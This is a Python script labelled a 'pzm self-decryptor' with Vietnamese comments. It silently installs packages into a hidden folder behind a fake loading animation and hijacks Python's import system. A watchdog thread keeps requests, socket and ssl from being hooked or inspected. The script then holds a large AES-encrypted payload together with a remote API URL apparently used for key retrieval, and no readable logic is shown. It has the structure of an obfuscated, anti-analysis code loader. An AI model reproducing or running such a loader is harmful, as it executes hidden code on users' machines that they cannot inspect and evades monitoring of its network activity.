#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# File auto-generated - pzm self-decryptor
import requests, struct, base64, json
from argon2.low_level import hash_secret_raw, Type
from ecdsa import VerifyingKey, NIST521p
from Crypto.Cipher import AES

import sys
import os
import builtins
import subprocess
import threading
import time
import importlib
import importlib.util
import types
import inspect

def sandbox_install():
    # --- chuẩn bị sandbox trước khi cô lập ---
    base_dir = sys.path[0]
    sandbox_dir = os.path.join(base_dir, "data", "manhs", "pymakaizu")
    os.makedirs(sandbox_dir, exist_ok=True)

    # possible site-packages path for pip --target
    site_path = os.path.join(sandbox_dir, "lib", f"python{sys.version_info.major}.{sys.version_info.minor}", "site-packages")

    # đảm bảo sandbox_dir và site_path được ưu tiên trong sys.path
    if sandbox_dir not in sys.path:
        sys.path.insert(0, sandbox_dir)
    if os.path.isdir(site_path) and site_path not in sys.path:
        sys.path.insert(0, site_path)

    # Cô lập environment nhưng giữ sandbox trong tầm nhìn
    sys.path[:] = [base_dir, sandbox_dir] + [p for p in sys.path if p not in (base_dir, sandbox_dir)]
    os.environ['PYTHONPATH'] = os.pathsep.join([sandbox_dir, base_dir])

    # khóa import (vẫn cho phép vài module nội bộ)
    real_import = builtins.__import__
    def locked_import(name, *args, **kwargs):
        allowed = ('sys','os','builtins','importlib','threading','time','subprocess','inspect','types','rich')
        return real_import(name, *args, **kwargs)
    builtins.__import__ = locked_import

    # 3) Lấy danh sách import từ file hiện tại (nếu có)
    imports = []
    try:
        with open(sys.argv[0], 'r', encoding='utf-8') as f:
            for line in f:
                s = line.strip()
                if s.startswith("import ") or s.startswith("from "):
                    parts = s.replace(",", " ").split()
                    if parts[0] == "import":
                        imports.extend(p for p in parts[1:] if p.isidentifier())
                    elif parts[0] == "from":
                        imports.append(parts[1].split(".")[0])
    except Exception:
        pass
    std_modules = set(sys.builtin_module_names)
    imports = [m for m in set(imports) if m not in std_modules]

    # 4) Loading effect (only dots)
    loading_flag = {"on": True}
    def loading_effect():
        dots = [".", "..", "..."]
        idx = 0
        while loading_flag["on"]:
            print(f"\rLoading{dots[idx % 3]} ", end='', flush=True)
            idx += 1
            time.sleep(0.4)
        # xóa dòng khi xong, giữ im lặng
        print("\r   ", end='', flush=True)
    t_loader = threading.Thread(target=loading_effect, daemon=True)
    t_loader.start()

    # 5) Cài packages vào sandbox dir (im lặng)
    for pkg in imports:
        try:
            subprocess.run(
                [sys.executable, "-m", "pip", "install", "--target", sandbox_dir, pkg],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                check=False
            )
        except Exception:
            pass

    # sau khi pip xong, đảm bảo site_path tồn tại trong sys.path nếu pip tạo nó
    if os.path.isdir(site_path) and site_path not in sys.path:
        sys.path.insert(0, site_path)
    if sandbox_dir not in sys.path:
        sys.path.insert(0, sandbox_dir)

    # invalidate caches để Python nhận file mới vừa cài
    try:
        importlib.invalidate_caches()
    except Exception:
        pass

    # dừng loading
    loading_flag["on"] = False
    t_loader.join()

    # 6) Import lại các gói (nếu cần) từ sandbox — tự cài nếu thiếu
    def ensure_import(pkg):
        try:
            # nếu không tìm thấy, thử pip cài lại (idempotent)
            if importlib.util.find_spec(pkg) is None:
                subprocess.run(
                    [sys.executable, "-m", "pip", "install", "--target", sandbox_dir, pkg],
                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=False
                )
                # re-add paths after install
                if os.path.isdir(site_path) and site_path not in sys.path:
                    sys.path.insert(0, site_path)
                if sandbox_dir not in sys.path:
                    sys.path.insert(0, sandbox_dir)
                try:
                    importlib.invalidate_caches()
                except Exception:
                    pass
            # cuối cùng import
            return __import__(pkg)
        except Exception:
            return None

    for pkg in imports:
        try:
            ensure_import(pkg)
        except Exception:
            pass

    # 7) Anti-hook cho requests, socket, ssl
    protected_names = ["requests", "socket", "ssl"]
    originals = {}

    class ProxyModule(types.ModuleType):
        def __init__(self, orig):
            super().__init__(orig.__name__)
            object.__setattr__(self, "_orig", orig)
        def __getattr__(self, name):
            return getattr(self._orig, name)
        def __setattr__(self, name, value):
            raise AttributeError("Module is read-only")
        def __dir__(self):
            return dir(self._orig)

    def snapshot_module(name):
        try:
            mod = ensure_import(name)
            if mod is None:
                return None
        except Exception:
            return None
        attrs = {}
        for k, v in list(vars(mod).items()):
            if k.startswith("__"):
                continue
            attrs[k] = v
        try:
            proxy = types.MappingProxyType(dict(attrs))
        except Exception:
            proxy = None
        originals[name] = {"module": mod, "attrs": attrs, "proxy": proxy}
        return originals[name]

    for name in protected_names:
        try:
            info = snapshot_module(name)
            if info is not None:
                sys.modules[name] = ProxyModule(info["module"])
        except Exception:
            pass

    stop_watchdog = {"now": False}
    def watchdog():
        interval = 0.5
        while not stop_watchdog["now"]:
            for name, info in list(originals.items()):
                try:
                    cur_mod = sys.modules.get(name)
                    orig_mod = info["module"]
                    if cur_mod is not orig_mod:
                        try:
                            sys.modules[name] = ProxyModule(orig_mod)
                        except Exception:
                            pass
                        continue
                    for attr_name, orig_obj in info["attrs"].items():
                        try:
                            cur_obj = getattr(cur_mod, attr_name, None)
                        except Exception:
                            cur_obj = None
                        if cur_obj is not orig_obj:
                            try:
                                setattr(orig_mod, attr_name, orig_obj)
                                sys.modules[name] = ProxyModule(orig_mod)
                            except Exception:
                                pass
                except Exception:
                    pass
            time.sleep(interval)

    t_watch = threading.Thread(target=watchdog, daemon=True)
    t_watch.start()

    # 8) Ép Python luôn tìm trong sandbox_dir trước bằng MetaPathFinder
    try:
        import importlib.machinery
        import importlib.abc
    except Exception:
        importlib = None

    class SandboxFinder(importlib.abc.MetaPathFinder if importlib else object):
        def find_spec(self, fullname, path=None, target=None):
            try:
                # look for package dir with __init__.py
                candidate = os.path.join(sandbox_dir, fullname.replace(".", os.sep))
                init_file = os.path.join(candidate, "__init__.py")
                if os.path.isdir(candidate) and os.path.exists(init_file):
                    return importlib.util.spec_from_file_location(fullname, init_file)
                # look for single-file module
                py_file = candidate + ".py"
                if os.path.exists(py_file):
                    return importlib.util.spec_from_file_location(fullname, py_file)
            except Exception:
                pass
            return None

    # Insert finder at front so sandbox wins
    try:
        if not any(isinstance(f, SandboxFinder) for f in sys.meta_path):
            sys.meta_path.insert(0, SandboxFinder())
    except Exception:
        pass

    guardian = {
        "_originals": originals,
        "_watch_thread": t_watch,
        "_stop": stop_watchdog,
        "_sandbox_dir": sandbox_dir
    }

    return guardian

if __name__ == "__main__":
    guard = sandbox_install()



META = {
  "enc_id": "7796",
  "api_url": "https://api-l7k1.onrender.com/data",
  "salt_b64": "Q8+tnBoMMVvNA1bwl0v3XA==",
  "nonce_b64": "yQeNHABf6Yah4pjl",
  "tag_b64": "ubP9gnJ44RRrai6fHy6wFQ==",
  "cipher_b64": "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